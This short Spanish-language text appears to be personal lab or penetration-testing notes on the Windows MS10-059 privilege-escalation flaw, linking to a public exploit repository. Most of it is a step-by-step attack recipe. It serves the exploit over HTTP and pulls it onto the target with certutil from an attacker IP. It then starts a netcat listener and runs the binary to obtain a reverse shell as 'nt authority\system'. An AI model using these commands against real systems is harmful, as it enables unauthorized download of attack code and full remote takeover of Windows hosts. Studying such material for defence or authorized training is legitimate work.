https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-059

La función de rastreo para servicios en Microsoft Windows Vista SP1 y SP2, Windows Server 2008 Gold, SP2 y R2, y Windows 7 tiene ACL incorrectas en sus claves de registro, lo que permite a los usuarios locales obtener privilegios a través de vectores que involucran una canalización con nombre y suplantación, también conocido como "Vulnerabilidad de ACL de clave de registro de rastreo".

** Ataque a equipo objetivo usando este exploit **
1. Descargamos el exploit "MS10-059.exe"
2. Transferimos el binaro a la máquina objetivo:
	1. Servidor web en local ofreciendo el fichero --> `python3 -m http.server 80`
	2. Transferencia desde la máquina objetivo --> `certutil.exe -f -urlcache http://10.10.14.20/MS10-059.exe MS10-059.exe`
3. Montar en local puerto en escucha de reverse shell --> `rlwrap nc -nlvp 443`
4. Ejecutar el binaro --> `MS10-059.exe 10.10.14.20 443`
5. Obtenemos una reverse shell con privilegios de "nt authority\system"